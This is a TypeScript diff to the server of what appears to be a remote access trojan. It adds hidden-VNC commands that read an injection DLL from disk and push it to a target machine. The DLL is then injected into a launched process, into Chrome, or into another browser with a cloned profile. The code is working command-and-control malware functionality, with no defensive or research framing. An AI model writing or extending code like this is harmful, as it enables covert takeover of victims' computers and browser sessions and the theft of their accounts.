@@ -1,6 +1,8 @@
 import type { ServerWebSocket } from "bun";
 import { decode as msgpackDecode, encode as msgpackEncode } from "@msgpack/msgpack";
 import { v4 as uuidv4 } from "uuid";
+import { existsSync, readFileSync } from "fs";
+import path from "path";
 import * as clientManager from "../clientManager";
 import { logger } from "../logger";
 import { metrics } from "../metrics";
@@ -8,6 +10,23 @@ import { encodeMessage } from "../protocol";
 import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
 import type { ClientInfo } from "../types";
+
+// Cache the injection DLL bytes so we read the file only once.
+// Sent as raw binary via msgpack — no base64 needed.
+let _cachedInjectionDll: Uint8Array | null = null;
+let _dllCacheChecked = false;
+function getInjectionDllBytes(): Uint8Array | null {
+  if (_dllCacheChecked) return _cachedInjectionDll;
+  _dllCacheChecked = true;
+  const dllPath = path.resolve(import.meta.dir, "../../dist-clients/HVNCInjection.x64.dll");
+  if (existsSync(dllPath)) {
+    _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
+    logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
+  } else {
+    logger.warn(`[hvnc] injection DLL not found at ${dllPath}`);
+  }
+  return _cachedInjectionDll;
+}
 
 function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
   if (typeof raw === "string") {
@@ -581,6 +600,46 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     case "hvnc_start_process":
       sendHVNCCommand(target, "hvnc_start_process", { path: String(payload.path || "") });
       break;
+    case "hvnc_start_process_injected": {
+      const dllData = getInjectionDllBytes();
+      if (!dllData) {
+        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_process_injected");
+        break;
+      }
+      sendHVNCCommand(target, "hvnc_start_process_injected", {
+        path: String(payload.path || ""),
+        search_path: String(payload.search_path || ""),
+        replace_path: String(payload.replace_path || ""),
+        dll: dllData,
+      });
+      break;
+    }
+    case "hvnc_start_chrome_injected": {
+      const dllData = getInjectionDllBytes();
+      if (!dllData) {
+        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_chrome_injected");
+        break;
+      }
+      sendHVNCCommand(target, "hvnc_start_chrome_injected", {
+        path: String(payload.path || ""),
+        dll: dllData,
+      });
+      break;
+    }
+    case "hvnc_start_browser_injected": {
+      const dllData = getInjectionDllBytes();
+      if (!dllData) {
+        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_browser_injected");
+        break;
+      }
+      sendHVNCCommand(target, "hvnc_start_browser_injected", {
+        browser: String(payload.browser || ""),
+        path: String(payload.path || ""),
+        clone: payload.clone !== false,
+        dll: dllData,
+      });
+      break;
+    }
     default:
       break;
   }
